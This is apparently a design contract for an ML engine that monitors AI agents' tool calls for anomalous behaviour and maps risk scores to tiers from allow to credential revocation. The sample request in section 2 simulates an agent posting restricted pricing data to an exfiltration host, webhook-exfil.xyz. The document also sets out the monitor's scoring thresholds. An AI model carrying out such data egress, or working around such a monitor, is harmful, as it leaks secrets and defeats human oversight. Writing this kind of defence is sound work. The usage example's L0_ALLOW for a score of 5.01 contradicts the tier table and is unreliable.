# Model Integration Contract — Identity Drift Detection

> **Status:** Finalized for Phase 5. Represents the actual implemented inference pipeline and typed schemas.  
> **Authors:** Senior ML Engineer (ML Workstream)  
> **Target Consumer:** Backend / Gateway Teammate  

---

## 1. System Responsibility Boundary

- **ML Model Responsibilities:**
  - Ingest atomic tool invocation requests and session contexts.
  - Compute role-conditioned and sequence-based behavioral anomaly scores ($A = \sum w_i [-\log p_i]$).
  - Compute supervised behavioral risk probabilities without relying on static policy shortcuts.
  - Return granular dimension scores and machine-readable reason codes explaining why an action is anomalous.
  - Maintain session history buffers with complete cross-agent isolation.
- **Backend / Gateway Responsibilities:**
  - Agent authentication, API credential verification, and authorization scopes.
  - Deterministic hard-policy enforcement (RBAC/ABAC boundary checks).
  - Gateway decision execution: **Deterministic policy denials MUST NEVER be overridden by any ML score**.
  - Action lifecycle enforcement: Sandboxing, network proxying, approval workflows, and step-up challenge triggers.

---

## 2. API Contract & Schemas

### Request Schema (`InferenceRequest`)

```json
{
  "event_id": "evt-sample-001",
  "session_id": "sess-procure-99",
  "agent_id": "agent-procure-01",
  "agent_role": "procurement",
  "timestamp": "2026-10-25T14:30:00Z",
  "step_index": 2,
  "action": {
    "tool": "http_post",
    "operation": "write",
    "resource": "raw_payload",
    "resource_sensitivity": "restricted",
    "destination": "https://webhook-exfil.xyz/collector",
    "destination_trust_tier": "untrusted_external",
    "record_count": 1,
    "data_volume_bytes": 65536,
    "is_allowed_by_policy": true
  },
  "context": {
    "task_id": "task-quote-check-01",
    "task_category": "procurement",
    "policy_version": "v1.0",
    "permission_scope": [
      "search_suppliers",
      "read_vendor_quote",
      "http_post"
    ],
    "delegation_chain": [],
    "session_age_seconds": 45.0,
    "untrusted_content_in_context": false,
    "sensitive_data_accessed_in_session": true,
    "taint_lineage": ["pricing_secret"]
  }
}
```

#### Field Specifications:
- `event_id` (string, required): Unique UUID or event hash.
- `session_id` (string, required): Active session or thread ID. Used to isolate bounded sliding-window history buffers.
- `agent_id` (string, required): Identity of the autonomous agent.
- `agent_role` (string, required): Declared agent role (e.g., `customer_support`, `procurement`, `devops_engineer`, `financial_analyst`).
- `timestamp` (string, required): ISO-8601 UTC timestamp.
- `step_index` (integer, required): 0-indexed action counter in current session.
- `action.tool` (string, required): Name of tool being proposed for execution.
- `action.operation` (string, optional, default="query"): `query`, `read`, `write`, `delete`, `execute`, `export`.
- `action.resource_sensitivity` (string, optional, default="internal"): `public`, `internal`, `confidential`, `restricted`.
- `action.destination_trust_tier` (string, optional, default="trusted_internal"): `trusted_internal`, `partner_approved`, `untrusted_external`.
- `action.is_allowed_by_policy` (boolean, required): Gateway evaluation result of deterministic boundary check.
- `context.permission_scope` (list of strings, optional): Declared tool allowlist for agent.
- `context.sensitive_data_accessed_in_session` (boolean, optional, default=false): Taint flag indicating whether sensitive records have been read into agent working memory.

---

### Response Schema (`InferenceResponse`)

```json
{
  "event_id": "evt-sample-001",
  "session_id": "sess-procure-99",
  "agent_id": "agent-procure-01",
  "timestamp": "2026-10-25T14:30:00Z",
  "deterministic_policy": {
    "is_violation": false,
    "reasons": []
  },
  "composite_anomaly": {
    "anomaly_score": 13.3053,
    "threshold": 5.5,
    "is_anomaly": true,
    "dimension_scores": {
      "tool_unusualness": 1.5185,
      "operation_unusualness": 1.4184,
      "resource_sensitivity_tier_unusualness": 0.7259,
      "destination_trust_tier_num_unusualness": 1.3863,
      "sensitive_egress_penalty": 4.0,
      "sequence_unusualness": 4.1271
    }
  },
  "behavioral_risk": {
    "risk_probability": 0.9976,
    "threshold": 0.1,
    "is_high_risk": true,
    "calibrated_probability": null
  },
  "risk_summary": {
    "recommended_tier": "L3_BLOCK",
    "reasons": [
      "UNUSUAL_ACTION_SEQUENCE_TRANSITION",
      "SENSITIVE_DATA_EGRESS_TO_UNTRUSTED_DESTINATION",
      "HIGH_ANOMALY_SCORE",
      "BEHAVIORAL_MODEL_ELEVATED_RISK"
    ],
    "uncertainty": "high",
    "is_cold_start": true
  },
  "model_versions": {
    "composite_detector": "v1.0-tuned",
    "logistic_regression": "v1.0-behavioral",
    "schema_version": "v1.0"
  },
  "inference_status": "SUCCESS",
  "error_message": null
}
```

---

## 3. Decision Tiers and Enforcement Mapping

| Tier | Code | Gateway Action | Trigger Condition |
| :---: | :---: | :--- | :--- |
| **L0** | `L0_ALLOW` | Allow tool execution directly | `is_violation == false`, `anomaly_score < 3.5`, `is_high_risk == false` |
| **L1** | `L1_OBSERVE` | Allow tool execution with enhanced telemetry | `3.5 <= anomaly_score < 5.5` |
| **L2** | `L2_STEP_UP` | Require human-in-the-loop approval or MFA token | `anomaly_score >= 5.5` OR `risk_probability >= 0.10` |
| **L3** | `L3_BLOCK` | Deny action immediately | `is_allowed_by_policy == false` OR `sensitive_egress_indicator == true` OR `anomaly_score >= 8.5` |
| **L4** | `L4_ISOLATE` | Terminate session and revoke agent credentials | Repeated L3 blocks or critical destructive policy violations |

> **Safety Invariant:** If `deterministic_policy.is_violation == true`, the backend must enforce an immediate block (`L3_BLOCK` or `L4_ISOLATE`). The ML risk score cannot reduce friction or override policy denials.

---

## 4. Standard Reason Codes Vocabulary

- `HARD_POLICY_DISALLOWED`: Tool or action violated static RBAC/ABAC authorization rules.
- `OUT_OF_PERMISSION_SCOPE`: Tool is absent from the declared agent permission manifest.
- `HIGH_ANOMALY_SCORE`: Total negative log-likelihood anomaly score exceeded calibrated threshold ($\tau=5.5$).
- `UNUSUAL_TOOL_FOR_ROLE`: Proposed tool has low empirical frequency for the agent's declared role.
- `UNUSUAL_ACTION_SEQUENCE_TRANSITION`: State transition $S_{t-1} \to S_t$ is anomalous under the Markov sequence model.
- `SENSITIVE_DATA_EGRESS_TO_UNTRUSTED_DESTINATION`: Agent accessed confidential/restricted data in session history and proposed transmitting to an untrusted external endpoint.
- `BEHAVIORAL_MODEL_ELEVATED_RISK`: Supervised behavioral classifier predicted high probability of drift ($P \ge 0.10$).
- `SUSTAINED_HIGH_VOLUME_DRIFT`: Rolling EWMA of request volume diverged from the role baseline.
- `FAIL_SAFE_ERROR_POLICY_DENIED`: Fallback error state activated due to malformed input or unhandled exception.

---

## 5. Artifact Paths and Versioning

All models are frozen and versioned in `model/artifacts/`:
- `feature_extractor.joblib`: Preprocessor and vocabulary encoder.
- `tuned_composite_detector.joblib`: Fused likelihood and sequence anomaly detector ($\tau=5.5$).
- `logistic_regression_behavioral.joblib`: Supervised behavioral probability estimator ($\tau=0.10$).
- `sliding_window_drift_detector.joblib`: Rolling window EWMA detector.
- `model_metadata.json`: Serialization metadata and version records.

---

## 6. Runtime Usage Example (Python Interface)

```python
from model.src.identity_drift.inference.engine import IdentityDriftInferenceEngine

# 1. Initialize engine once at application startup
engine = IdentityDriftInferenceEngine()

# 2. Score incoming action request
response = engine.evaluate({
    "event_id": "evt-1001",
    "session_id": "sess-user-01",
    "agent_id": "agent-support-01",
    "agent_role": "customer_support",
    "timestamp": "2026-10-25T14:35:00Z",
    "step_index": 0,
    "action": {
        "tool": "search_knowledgebase",
        "operation": "query",
        "resource": "public_faq",
        "resource_sensitivity": "public",
        "destination": "internal_search",
        "destination_trust_tier": "trusted_internal",
        "is_allowed_by_policy": True,
    },
    "context": {
        "task_id": "task-01",
        "task_category": "customer_support",
    }
})

# 3. Read gateway decision tier
print(response.risk_summary.recommended_tier)  # L0_ALLOW
print(response.composite_anomaly.anomaly_score) # 5.01
```

---

## 7. Fail-Safe Expectations & Error Handling

- **Malformed Payloads:** If an incoming request violates the Pydantic schema, `IdentityDriftInferenceEngine` catches the error and returns `inference_status="FAIL_SAFE_ERROR"`, `recommended_tier="L2_STEP_UP"`. It **never** defaults to `L0_ALLOW`.
- **Latency Guarantee:** Local Python inference executes in **0.245 ms** (Composite) and **0.342 ms** (Logistic Regression). Total evaluation completes well within a 1.0 ms budget.
